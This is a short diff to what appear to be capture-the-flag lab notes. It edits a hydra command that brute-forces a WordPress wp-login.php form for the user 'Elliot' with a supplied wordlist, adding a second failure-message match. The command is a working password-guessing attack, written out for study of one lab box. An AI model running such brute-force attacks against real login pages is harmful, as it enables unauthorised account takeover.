@@ -17,7 +17,7 @@ modes can be eg. `ssh`, `rdp`,`vnc`, `ftp` or `http[s]-post-form`.
 
 An example of an attack made towards a wordpress site eg. looked like this:
 ```
-hydra $RHOST -l Elliot -P fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username"
+hydra $RHOST -l Elliot -P fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username||The password field is empty"
 ```
 (For this particular box, we were given a file `fsocity.dic` to use for fuzzing)
 
